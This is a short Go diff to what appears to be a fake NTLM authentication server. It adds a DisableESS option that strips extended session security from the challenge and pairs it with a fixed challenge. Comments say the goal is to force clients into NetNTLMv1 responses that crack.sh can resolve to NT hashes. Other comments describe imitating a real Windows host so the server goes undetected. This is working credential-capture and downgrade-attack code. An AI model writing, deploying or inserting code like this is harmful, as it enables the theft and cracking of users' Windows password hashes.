@@ -43,6 +43,12 @@ type Options struct {
 	// a fresh random challenge, which is the safe default.
 	Challenge *[8]byte
 
+	// DisableESS strips extended session security from the CHALLENGE, so an
+	// NTLMv1-capable client answers with a plain NetNTLMv1 response that crack.sh
+	// can resolve to the NT hash. Pair it with a fixed Challenge. A client that
+	// computes NTLMv2 is unaffected.
+	DisableESS bool
+
 	// AdvertiseVersion, when set, is the Windows version announced in the NTLM
 	// CHALLENGE. A real Windows host always sends one; omitting it (nil) is a tell
 	// that the server is synthetic.
@@ -119,11 +125,21 @@ func NewServer(options Options) (*Server, error) {
 	// version — and is set on both protocols so a captured response and the
 	// server's fingerprint are identical whichever a client speaks.
 	var onAccept func(*spnego.AcceptContext)
-	if options.Challenge != nil || options.AdvertiseVersion != nil {
-		challenge, advertiseVersion := options.Challenge, options.AdvertiseVersion
+	switch {
+	case options.DisableESS:
+		// Own the whole CHALLENGE so extended session security can be stripped;
+		// the fixed challenge and advertised version fold into it.
+		targetName, fixed, advertiseVersion := options.Domain, options.Challenge, options.AdvertiseVersion
 		onAccept = func(accept *spnego.AcceptContext) {
-			if challenge != nil {
-				accept.ServerChallenge = *challenge
+			accept.ChallengeProvider = func(negotiateBytes []byte) ([]byte, error) {
+				return downgradeChallenge(negotiateBytes, targetName, fixed, advertiseVersion)
+			}
+		}
+	case options.Challenge != nil || options.AdvertiseVersion != nil:
+		fixed, advertiseVersion := options.Challenge, options.AdvertiseVersion
+		onAccept = func(accept *spnego.AcceptContext) {
+			if fixed != nil {
+				accept.ServerChallenge = *fixed
 			}
 			if advertiseVersion != nil {
 				accept.Version = advertiseVersion
